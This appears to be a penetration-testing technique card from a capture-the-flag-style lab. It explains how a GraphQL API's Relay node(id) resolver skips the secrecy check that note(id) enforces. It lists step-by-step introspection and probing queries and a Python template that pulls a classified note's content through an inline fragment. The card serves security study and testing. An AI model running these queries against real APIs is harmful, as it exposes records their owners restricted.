---
name: graphql_relay_node_interface_auth_bypass
vuln_type: graphql
sub_technique: relay_node_auth_bypass
category: exploitation
safety_level: safe
---

# Graphql Relay Node Interface Bypasses Per-Type Authorization — Node(Id) Lacks Is Secret Check That Note(Id) Enforces

## When to Apply

A GraphQL API implements the Relay-style global `Node` interface with a `node(id: ID!): Node` query field alongside type-specific query fields (e.g., `note(id: ID!): Note`). The type-specific resolver (`note`) enforces authorization checks (e.g., checking `is_secret` flag and throwing an error for classified documents), but the generic `node` resolver queries the same database table without applying the same authorization logic. Since both resolvers return the same underlying data (just through different GraphQL paths), an attacker can bypass the authorization by querying through `node(id)` instead of `note(id)`, using an inline fragment `... on Note { title content }` to access the concrete type's fields.

## Prerequisites

- GraphQL API with Relay-style Node interface (node(id: ID!): Node query)
- Type-specific resolver (note) has authorization checks (e.g., is_secret)
- Node resolver queries same data without equivalent authorization checks
- Introspection enabled (to discover node field and Note type)
- Sequential integer IDs allow inferring hidden record IDs from gaps

## Steps

1. Introspect schema to discover query fields:\n   `{ __schema { queryType { fields { name } } } }`\n   → finds: notes, note, me, node\n2. List public notes to find ID gaps:\n   `{ notes { id title isSecret } }` → ids 1,3,4,5 (id=2 missing)\n3. Try direct access: `{ note(id: "2") { title content } }`\n   → 'Access Denied: This note is classified.'\n4. Probe via Node interface: `{ node(id: "2") { id } }`\n   → returns object (not null) — no auth check\n5. Use inline fragment for concrete fields:\n   `{ node(id: "2") { ... on Note { title content } } }`\n   → returns classified note content with flag

## Code Template

```
import json, urllib.request\ndef gql(url, query):\n    req = urllib.request.Request(url, json.dumps({'query': query}).encode(),\n        {'Content-Type': 'application/json'})\n    return json.loads(urllib.request.urlopen(req).read())\n\n# Bypass: use node() instead of note()\nresult = gql(ENDPOINT, '''\n{ node(id: "2") { ... on Note { title content } } }\n''')\nprint(result['data']['node']['content'])  # flag
```

## Examples

### Example 1

- **protected_resolver**: note(id) checks is_secret → throws GraphQLError('Access Denied')
- **unprotected_resolver**: node(id) queries same table without is_secret check
- **inline_fragment**: ... on Note { title content } — resolves concrete fields through Node interface
- **id_inference**: Sequential integer IDs — gap in public notes list reveals hidden note ID
- **apollo_server**: ApolloServer with introspection: true, depthLimit(5)

This is a classic GraphQL authorization inconsistency where the same data is accessible through multiple query paths, but authorization is only applied to one path. The Relay Node interface pattern (node(id: ID!): Node) is designed for global object lookup, but developers often forget to replicate per-type authorization checks in the generic node resolver. The inline fragment `... on Note` allows accessing concrete type fields through the interface, effectively bypassing the type-specific resolver's authorization.
